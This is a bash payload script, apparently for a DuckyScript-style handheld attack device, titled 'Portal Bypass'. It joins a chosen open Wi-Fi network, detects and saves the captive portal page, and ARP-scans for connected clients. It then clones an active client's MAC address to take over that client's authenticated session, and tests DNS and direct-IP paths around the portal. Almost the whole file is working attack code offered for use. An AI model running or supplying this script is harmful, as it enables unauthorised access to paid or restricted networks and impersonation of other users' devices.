#!/bin/bash
# Title: Portal Bypass
# Author: bad-antics
# Description: Captive portal detection and automated bypass techniques
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/portalbypass"
mkdir -p "$LOOT_DIR"

PROMPT "PORTAL BYPASS

Detect and bypass captive portals
on wireless networks.

Techniques:
- MAC cloning from auth'd clients
- DNS tunnel bypass
- Direct IP access probing
- HTTP redirect interception
- Portal page credential harvest
- TTL manipulation

Press OK to configure."

# Interface selection
IFACE=$(TEXT_PICKER "Interface:" "wlan1")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) IFACE="wlan1" ;; esac

[ ! -d "/sys/class/net/$IFACE" ] && { ERROR_DIALOG "Interface $IFACE not found!"; exit 1; }

# Target SSID
TARGET_SSID=$(TEXT_PICKER "Target SSID:" "FreeWiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_SSID="FreeWiFi" ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/bypass_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "START PORTAL BYPASS?

Interface: $IFACE
Target SSID: $TARGET_SSID

Will attempt multiple bypass
techniques automatically.

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Analyzing portal..."

echo "========================================" > "$REPORT"
echo "     PORTAL BYPASS REPORT              " >> "$REPORT"
echo "========================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Interface: $IFACE" >> "$REPORT"
echo "Target: $TARGET_SSID" >> "$REPORT"
echo "" >> "$REPORT"

# Phase 1: Connect to the network
LOG "Phase 1: Connecting to $TARGET_SSID..."
echo "--- PHASE 1: CONNECTION ---" >> "$REPORT"

# Kill interfering processes
killall wpa_supplicant dhclient 2>/dev/null
sleep 1

# Connect (open network)
iwconfig "$IFACE" essid "$TARGET_SSID" 2>/dev/null
dhclient "$IFACE" -timeout 10 2>/dev/null

# Get assigned IP and gateway
MY_IP=$(ip addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -1)
GATEWAY=$(ip route show dev "$IFACE" 2>/dev/null | grep default | awk '{print $3}' | head -1)

echo "  Assigned IP: ${MY_IP:-none}" >> "$REPORT"
echo "  Gateway: ${GATEWAY:-none}" >> "$REPORT"

[ -z "$MY_IP" ] && { SPINNER_STOP; ERROR_DIALOG "Failed to connect to $TARGET_SSID"; exit 1; }

# Phase 2: Detect captive portal
LOG "Phase 2: Detecting portal..."
echo "" >> "$REPORT"
echo "--- PHASE 2: PORTAL DETECTION ---" >> "$REPORT"

PORTAL_DETECTED=0
PORTAL_URL=""

# Test connectivity to known endpoints
for url in "http://connectivitycheck.gstatic.com/generate_204" "http://captive.apple.com/hotspot-detect.html" "http://detectportal.firefox.com/success.txt"; do
    RESP=$(curl -s -o /dev/null -w "%{http_code}:%{redirect_url}" --max-time 5 "$url" 2>/dev/null)
    CODE=$(echo "$RESP" | cut -d: -f1)
    REDIR=$(echo "$RESP" | cut -d: -f2-)

    echo "  $url → HTTP $CODE" >> "$REPORT"
    if [ "$CODE" = "302" ] || [ "$CODE" = "301" ] || [ "$CODE" = "307" ]; then
        PORTAL_DETECTED=1
        PORTAL_URL="$REDIR"
        echo "  REDIRECT → $REDIR" >> "$REPORT"
    fi
done

if [ $PORTAL_DETECTED -eq 0 ]; then
    echo "  Result: No captive portal detected (direct access)" >> "$REPORT"
    SPINNER_STOP
    PROMPT "NO PORTAL DETECTED

$TARGET_SSID has direct internet
access — no captive portal found.

Report: $REPORT"
    exit 0
fi

echo "  Portal URL: $PORTAL_URL" >> "$REPORT"

# Phase 3: Capture portal page
LOG "Phase 3: Capturing portal page..."
echo "" >> "$REPORT"
echo "--- PHASE 3: PORTAL CAPTURE ---" >> "$REPORT"

if [ -n "$PORTAL_URL" ]; then
    curl -s -L --max-time 10 "$PORTAL_URL" > "$LOOT_DIR/portal_page_${TIMESTAMP}.html" 2>/dev/null
    PORTAL_SIZE=$(wc -c < "$LOOT_DIR/portal_page_${TIMESTAMP}.html" 2>/dev/null || echo 0)
    echo "  Captured portal page: ${PORTAL_SIZE} bytes" >> "$REPORT"

    # Extract form fields
    FORMS=$(grep -oP '<input[^>]+name="[^"]+"' "$LOOT_DIR/portal_page_${TIMESTAMP}.html" 2>/dev/null | grep -oP 'name="[^"]+"')
    echo "  Form fields found:" >> "$REPORT"
    echo "$FORMS" | while read -r field; do
        echo "    $field" >> "$REPORT"
    done
fi

# Phase 4: Find authenticated clients
LOG "Phase 4: Finding auth'd clients..."
echo "" >> "$REPORT"
echo "--- PHASE 4: AUTHENTICATED CLIENTS ---" >> "$REPORT"

# ARP scan to find clients on the network
ARP_RESULTS=$(arp-scan -I "$IFACE" --localnet 2>/dev/null | grep -E "^[0-9]")
CLIENT_COUNT=$(echo "$ARP_RESULTS" | grep -c "." 2>/dev/null || echo 0)
echo "  Clients on network: $CLIENT_COUNT" >> "$REPORT"

AUTH_MACS=""
while IFS=$'\t' read -r ip mac vendor; do
    [ -z "$ip" ] && continue
    # Test if client has internet (TCP RST = authenticated)
    ONLINE=$(timeout 2 arping -I "$IFACE" -c 1 "$ip" 2>/dev/null | grep -c "reply")
    if [ "$ONLINE" -gt 0 ]; then
        echo "  $ip ($mac) — $vendor — ACTIVE" >> "$REPORT"
        AUTH_MACS="${AUTH_MACS}${mac}\n"
    fi
done <<< "$ARP_RESULTS"

# Phase 5: Bypass attempts
LOG "Phase 5: Attempting bypasses..."
echo "" >> "$REPORT"
echo "--- PHASE 5: BYPASS ATTEMPTS ---" >> "$REPORT"

BYPASSED=0

# Technique 1: MAC clone from authenticated client
if [ -n "$AUTH_MACS" ]; then
    CLONE_MAC=$(echo -e "$AUTH_MACS" | head -1 | tr -d '[:space:]')
    if [ -n "$CLONE_MAC" ]; then
        echo "  [1] MAC Clone: $CLONE_MAC" >> "$REPORT"
        ORIG_MAC=$(cat "/sys/class/net/$IFACE/address")
        ip link set "$IFACE" down 2>/dev/null
        ip link set "$IFACE" address "$CLONE_MAC" 2>/dev/null
        ip link set "$IFACE" up 2>/dev/null
        sleep 2
        dhclient "$IFACE" -timeout 5 2>/dev/null

        TEST=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://connectivitycheck.gstatic.com/generate_204" 2>/dev/null)
        if [ "$TEST" = "204" ]; then
            echo "  [1] RESULT: SUCCESS — MAC clone bypassed portal!" >> "$REPORT"
            BYPASSED=1
        else
            echo "  [1] RESULT: FAILED — restoring original MAC" >> "$REPORT"
            ip link set "$IFACE" down 2>/dev/null
            ip link set "$IFACE" address "$ORIG_MAC" 2>/dev/null
            ip link set "$IFACE" up 2>/dev/null
            dhclient "$IFACE" -timeout 5 2>/dev/null
        fi
    fi
fi

# Technique 2: DNS tunnel check
if [ $BYPASSED -eq 0 ]; then
    echo "  [2] DNS Tunnel: Testing DNS resolution..." >> "$REPORT"
    DNS_TEST=$(nslookup google.com 2>/dev/null | grep -c "Address")
    if [ "$DNS_TEST" -gt 1 ]; then
        echo "  [2] DNS resolves — tunnel possible via iodine/dns2tcp" >> "$REPORT"
        echo "  [2] RESULT: DNS AVAILABLE (manual tunnel setup needed)" >> "$REPORT"
    else
        echo "  [2] RESULT: DNS blocked" >> "$REPORT"
    fi
fi

# Technique 3: Direct IP bypass
if [ $BYPASSED -eq 0 ]; then
    echo "  [3] Direct IP: Testing direct IP access..." >> "$REPORT"
    for test_ip in "1.1.1.1" "8.8.8.8" "208.67.222.222"; do
        DIRECT=$(timeout 3 ping -c 1 "$test_ip" 2>/dev/null | grep -c "bytes from")
        if [ "$DIRECT" -gt 0 ]; then
            echo "  [3] RESULT: $test_ip reachable — ICMP bypass possible!" >> "$REPORT"
            BYPASSED=1
            break
        fi
    done
    [ $BYPASSED -eq 0 ] && echo "  [3] RESULT: Direct IP blocked" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "--- SUMMARY ---" >> "$REPORT"
if [ $BYPASSED -eq 1 ]; then
    echo "  STATUS: PORTAL BYPASSED" >> "$REPORT"
else
    echo "  STATUS: Portal active — manual bypass may be needed" >> "$REPORT"
fi
echo "========================================" >> "$REPORT"

SPINNER_STOP

if [ $BYPASSED -eq 1 ]; then
    PROMPT "PORTAL BYPASSED!

Network: $TARGET_SSID
Portal: $PORTAL_URL
Method: See report for details

Portal page saved to loot.

Report: $REPORT"
else
    PROMPT "PORTAL ANALYSIS COMPLETE

Network: $TARGET_SSID
Portal: $PORTAL_URL
Bypass: Not achieved

Findings:
- Clients found: $CLIENT_COUNT
- DNS available: check report
- Portal page captured

Report: $REPORT"
fi
